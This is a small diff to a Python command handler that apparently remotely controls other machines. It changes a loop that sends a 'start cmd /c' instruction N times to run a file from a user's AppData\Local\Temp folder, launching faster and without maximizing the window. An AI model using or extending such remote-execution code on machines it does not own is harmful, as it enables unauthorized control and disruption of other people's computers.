@@ -156,8 +156,8 @@ class Commands:
                 name = receiveMessage()
 
                 for i in range(int(args[0])):
-                    sendMessage(f"c n start /max cmd /c C:\\Users\\{username}\\AppData\\Local\\Temp\\{name}")
-                    sleep(0.5)
+                    sendMessage(f"c n start cmd /c C:\\Users\\{username}\\AppData\\Local\\Temp\\{name}")
+                    sleep(0.1)
 
                 return
             elif not args:
